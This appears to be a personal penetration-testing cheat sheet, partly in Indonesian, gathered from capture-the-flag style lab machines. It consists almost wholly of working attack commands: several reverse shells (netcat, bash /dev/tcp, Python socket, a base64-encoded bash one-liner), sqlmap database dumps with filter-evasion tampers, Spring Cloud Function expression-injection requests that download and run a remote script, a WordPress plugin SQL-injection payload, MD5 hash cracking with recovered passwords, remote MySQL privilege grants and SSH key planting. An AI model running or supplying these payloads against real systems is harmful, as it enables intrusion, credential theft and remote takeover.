check access 
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null


check service service --status-all => bisa untuk revshell atau tahap deffense
python3 -c "import pty;pty.spawn('/bin/bash')" => bisa untuk interactive shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f


sqlmap -u "" --current-db => bisa untuk dapetin database
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables
-D soccer_db -T accounts --dump

##with url
sqlmap -u http://167.71.207.218:50621/logins.php -X POST --data "username=foo&passw0rd='*&login-btn=" --batch --tamper=randomcase,space2comment -D web_blindsql --dump --time-sec 1 --threads=10


##revshell python

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.37',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);


##find permission privsec
find / -perm -u=s -type f 2>/dev/null

##fuzzing
nmap -p- --min-rate 10000 -oA scans/nmap_alltcp 10.10.10.138
nmap -sC -sV -p 22,25,80,110,111,143,443,745,993,995,3306,4190,4445,4559,5038,10000 -oA nmap/scriptstcp 10.10.10.7
nmap -A -T4 -oG writeup.gnmap 10.10.10.138
masscan -p1-65535,U:1-65535 10.129.95.203 --rate=1000
nmap -v -sV -p80,443 --script vuln -oA http_vuln 10.10.10.79
nmap -sC -sV ip -p-
nmap detail port 
sudo nmap -sU -top-ports=100 panda.htb
nmap -p22,50051 -sCV -Pn 10.129.37.201 -oN targeted
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.34.244 -oG allPorts
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -e .txt


##fuzzing subdomain
gobuster vhost -u stocker.htb -w /usr/share/wordlists/subdomains-top1million-110000.txt
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain 
gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20 -o scans/

##kalau misal udah fuzzing gak ada ada apa apa fungzzing pake /cig-bin -x sh,cgi,pl

gobuster-admindir-medium-php_txt_html_zip


###fuzzing directory
gobuster dir -u previse.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 
wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 199691

dirsearch -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


wfuzz -c --sc 200 -w ./common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -u http://10.10.10.191/FUZZFUZ2Z


####mysql   
GRANT ALL PRIVILEGES ON *.* TO root@10.129.82.0 IDENTIFIED by 'wizz' WITH GRANT OPTION;
create user 'wiz'@'%' identified by 'wiz';
grant all privileges on *.* to wiz@'%';

get domain
curl -I 10.129.230.29

curl -S 

curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.34/4444 0>&1" http://10.129.81.227/shell.php

### fuzzing lfi
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --hc 404 --hh 206 http://192.168.0.119/index.php?file=FUZZ

check /proc/self/cmdline => untuk lihat cmdline terakhir

#### spring cloud revshell
curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"nc 10.10.14.52 4444")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/file.txt")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.19/rev.sh -o /tmp/exp.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/exp.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("nc 10.10.14.19 4444")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'


curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=33b508d232&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'


###hasing brute 

❯ cat hashes
administrator:15657792073e8a843d4f91fc403454e1
bill:13edad4932da9dbb57d9cd15b66ed104
michael:bd3dad50e2d578ecba87d5fa15ca5f85
john:a7eed23a7be6fe0d765197b1027453fe
dmytro:5d15340bded5b9395d5d14b9c21bc82b

❯ sed 's/^/NaCl/' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > newrockyou.txt
  
❯ john -w:newrockyou.txt hashes --format=Raw-MD5
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
NaCliluvhorsesandgym (bill)
NaClAaronthehottest (dmytro)
NaCl2applesplus2apples (michael)
Session completed


### windows
change /etc/passwd on windows
file:///c:/windows/win.ini


### listen samba
smbclient ldap
smbclient -L ////10.10.10.11.202//

listen smbclient with remote dir
smbclient //10.10.11.202/Public


### revshell php
echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzYvNDQ0NCAwPiYx" |base64 -d | bash    


#replace ssh
ssh-keygen
cp id_rsa.pub authorized_keys

create .ssh

ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.149.92
